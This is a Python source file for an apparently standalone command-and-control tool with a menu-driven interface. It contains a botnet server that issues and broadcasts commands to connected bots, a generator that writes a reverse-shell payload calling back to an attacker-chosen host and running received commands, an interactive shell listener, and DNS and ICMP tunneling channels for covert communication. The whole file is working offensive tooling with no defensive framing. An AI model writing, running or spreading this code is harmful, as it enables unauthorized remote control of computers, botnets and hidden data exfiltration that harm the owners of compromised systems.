def c2_framework():
    import socket
    import threading
    import base64
    import json
    import time
    import os
    from datetime import datetime
    from colorama import Fore, Style, init
    init()
    blood_banner()
    R = Fore.RED
    G = Fore.GREEN
    Y = Fore.YELLOW
    C = Fore.CYAN
    RESET = Style.RESET_ALL

    bots = {}
    commands_history = []

    def botnet_control_panel():
        connected_bots = {}
        listener_socket = None

        def start_server(host="0.0.0.0", port=4444):
            nonlocal listener_socket
            listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener_socket.bind((host, port))
            listener_socket.listen(100)
            print(f"{G}[+]{RESET} Botnet C2 Server started on {R}{host}:{port}{RESET}")

            while True:
                client, addr = listener_socket.accept()
                bot_id = f"{addr[0]}:{addr[1]}"
                connected_bots[bot_id] = {
                    "socket": client,
                    "ip": addr[0],
                    "port": addr[1],
                    "connected_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "status": "Active"
                }
                print(f"{G}[+]{RESET} New bot connected: {R}{bot_id}{RESET}")
                threading.Thread(target=handle_bot, args=(bot_id, client), daemon=True).start()

        def handle_bot(bot_id, client_socket):
            while True:
                try:
                    data = client_socket.recv(4096).decode()
                    if not data:
                        break
                    response = base64.b64decode(data).decode()
                    print(f"\n{G}[BOT {bot_id} RESPONSE]{RESET}\n{response}")
                except:
                    break
            connected_bots[bot_id]["status"] = "Offline"
            print(f"{R}[-]{RESET} Bot {bot_id} disconnected")

        def send_command(bot_id, command):
            if bot_id in connected_bots and connected_bots[bot_id]["status"] == "Active":
                try:
                    encoded = base64.b64encode(command.encode()).decode()
                    connected_bots[bot_id]["socket"].send(encoded.encode())
                    commands_history.append({
                        "bot_id": bot_id,
                        "command": command,
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    })
                    return True
                except:
                    return False
            return False

        def broadcast_command(command):
            sent_count = 0
            for bot_id in connected_bots:
                if send_command(bot_id, command):
                    sent_count += 1
            return sent_count

        def list_bots():
            print(f"\n{C}=== Connected Bots ==={RESET}")
            for bot_id, info in connected_bots.items():
                status_color = G if info["status"] == "Active" else R
                print(
                    f"{R}{bot_id}{RESET} | Status: {status_color}{info['status']}{RESET} | Connected: {info['connected_at']}")

        def stop_server():
            if listener_socket:
                listener_socket.close()
                print(f"{Y}[!]{RESET} Server stopped")

        while True:
            print(f"\n{R}1){RESET} {G}Start Botnet Server{RESET}")
            print(f"{R}2){RESET} {G}List Connected Bots{RESET}")
            print(f"{R}3){RESET} {G}Send Command to Bot{RESET}")
            print(f"{R}4){RESET} {G}Broadcast Command{RESET}")
            print(f"{R}5){RESET} {G}View Command History{RESET}")
            print(f"{R}6){RESET} {G}Stop Server & Back{RESET}")

            choice = input(f"\n{C}Select{R}: {RESET}")

            if choice == "1":
                host = input(f"{Y}Host{R} [{G}0.0.0.0{R}]: {RESET}") or "0.0.0.0"
                port = int(input(f"{Y}Port{R} [{G}4444{R}]: {RESET}") or 4444)
                threading.Thread(target=start_server, args=(host, port), daemon=True).start()
            elif choice == "2":
                list_bots()
            elif choice == "3":
                list_bots()
                bot_id = input(f"{Y}Bot ID{R}: {RESET}")
                cmd = input(f"{Y}Command{R}: {RESET}")
                if send_command(bot_id, cmd):
                    print(f"{G}[+]{RESET} Command sent!")
                else:
                    print(f"{R}[-]{RESET} Failed to send")
            elif choice == "4":
                cmd = input(f"{Y}Command to all bots{R}: {RESET}")
                count = broadcast_command(cmd)
                print(f"{G}[+]{RESET} Sent to {R}{count}{RESET} bots")
            elif choice == "5":
                for entry in commands_history[-10:]:
                    print(f"{R}{entry['timestamp']}{RESET} | {G}{entry['bot_id']}{RESET} | {entry['command']}")
            elif choice == "6":
                stop_server()
                break

    def backdoor_panel():
        sessions = {}

        def generate_payload(host, port, output_file="payload.py"):
            payload_code = f'''
import socket,subprocess,os,sys

HOST="{host}"
PORT={port}

def connect():
    s=socket.socket()
    s.connect((HOST,PORT))
    while True:
        data=s.recv(1024).decode()
        if data=="exit": break
        if data[:2]=="cd":
            os.chdir(data[3:])
        output=subprocess.getoutput(data)
        s.send(output.encode())
    s.close()

if __name__=="__main__":
    connect()
'''
            with open(output_file, "w") as f:
                f.write(payload_code)
            print(f"{G}[+]{RESET} Backdoor payload saved to {R}{output_file}{RESET}")

        def start_listener(port=5555):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(("0.0.0.0", port))
            s.listen(5)
            print(f"{G}[+]{RESET} Backdoor listener on port {R}{port}{RESET}")

            def handle_shell(client, addr):
                session_id = f"{addr[0]}:{addr[1]}"
                sessions[session_id] = client
                print(f"{G}[+]{RESET} Session opened: {R}{session_id}{RESET}")

                while True:
                    cmd = input(f"{R}{session_id}{RESET} {G}shell>{RESET} ")
                    if cmd == "exit":
                        client.send(b"exit")
                        break
                    client.send(cmd.encode())
                    response = client.recv(4096).decode()
                    print(response)

                client.close()
                del sessions[session_id]

            while True:
                client, addr = s.accept()
                threading.Thread(target=handle_shell, args=(client, addr)).start()

        def manage_sessions():
            print(f"\n{C}=== Active Sessions ==={RESET}")
            for idx, (sid, sock) in enumerate(sessions.items(), 1):
                print(f"{R}{idx}){RESET} {G}{sid}{RESET}")

        while True:
            print(f"\n{R}1){RESET} {G}Generate Payload{RESET}")
            print(f"{R}2){RESET} {G}Start Listener{RESET}")
            print(f"{R}3){RESET} {G}List Sessions{RESET}")
            print(f"{R}4){RESET} {G}Back{RESET}")

            choice = input(f"\n{C}Select{R}: {RESET}")

            if choice == "1":
                host = input(f"{Y}Callback Host{R}: {RESET}")
                port = input(f"{Y}Callback Port{R}: {RESET}")
                name = input(f"{Y}Filename{R}: {RESET}")
                generate_payload(host, port, name)
            elif choice == "2":
                port = int(input(f"{Y}Port{R}: {RESET}") or 5555)
                threading.Thread(target=start_listener, args=(port,), daemon=True).start()
            elif choice == "3":
                manage_sessions()
            elif choice == "4":
                break

    def covert_channels():
        def dns_tunnel():
            import dns.resolver
            from dnslib import DNSRecord, QTYPE

            def encode_data(data):
                return base64.b32encode(data.encode()).decode().replace("=", "")

            def decode_data(data):
                padding = 8 - (len(data) % 8)
                if padding != 8:
                    data += "=" * padding
                return base64.b32decode(data).decode()

            def send_query(domain, data_chunk):
                encoded = encode_data(data_chunk)
                query_domain = f"{encoded}.{domain}"
                try:
                    dns.resolver.resolve(query_domain, 'A')
                except:
                    pass

            def start_dns_server(domain):
                print(f"{G}[+]{RESET} DNS Tunnel server ready on domain: {R}{domain}{RESET}")
                while True:
                    cmd = input(f"{Y}Message to send{R}: {RESET}")
                    chunks = [cmd[i:i + 50] for i in range(0, len(cmd), 50)]
                    for chunk in chunks:
                        send_query(domain, chunk)
                        time.sleep(0.5)
                    print(f"{G}[+]{RESET} Sent via DNS tunnel")

            start_dns_server(input(f"{Y}Domain{R}: {RESET}"))

        def icmp_tunnel():
            from scapy.all import IP, ICMP, send, sniff

            def send_icmp_packet(target, data):
                packet = IP(dst=target) / ICMP(type="echo-request") / data
                send(packet, verbose=0)
                print(f"{G}[+]{RESET} ICMP packet sent to {R}{target}{RESET}")

            def icmp_sniffer():
                print(f"{G}[+]{RESET} ICMP sniffer started...")

                def packet_handler(pkt):
                    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
                        data = bytes(pkt[ICMP].payload).decode(errors='ignore')
                        if data:
                            print(f"\n{R}[ICMP DATA]{RESET} {G}{data}{RESET}")

                sniff(filter="icmp", prn=packet_handler)

            while True:
                print(f"\n{R}1){RESET} {G}Send ICMP Message{RESET}")
                print(f"{R}2){RESET} {G}ICMP Sniffer{RESET}")
                print(f"{R}3){RESET} {G}Back{RESET}")
                choice = input(f"\n{C}Select{R}: {RESET}")

                if choice == "1":
                    target = input(f"{Y}Target IP{R}: {RESET}")
                    msg = input(f"{Y}Message{R}: {RESET}")
                    send_icmp_packet(target, msg)
                elif choice == "2":
                    icmp_sniffer()
                elif choice == "3":
                    break

    while True:
        print(f"\n{R}╔════════════════════════════════════╗{RESET}")
        print(f"{R}║        {G}C2 FRAMEWORK MENU{RESET}         {R}║{RESET}")
        print(f"{R}╠════════════════════════════════════╣{RESET}")
        print(f"{R}║  {R}1){RESET} {G}Botnet Control Servers{RESET}       {R}║{RESET}")
        print(f"{R}║  {R}2){RESET} {G}Backdoor Management Panel{RESET}    {R}║{RESET}")
        print(f"{R}║  {R}3){RESET} {G}Covert Channels (DNS/ICMP){RESET}   {R}║{RESET}")
        print(f"{R}║  {R}4){RESET} {G}Back to Main Menu{RESET}            {R}║{RESET}")
        print(f"{R}╚════════════════════════════════════╝{RESET}")

        choice = input(f"\n{C}Choose{R} [{G}1-4{R}]: {RESET}")

        if choice == "1":
            botnet_control_panel()
        elif choice == "2":
            backdoor_panel()
        elif choice == "3":
            covert_channels()
        elif choice == "4":
            break


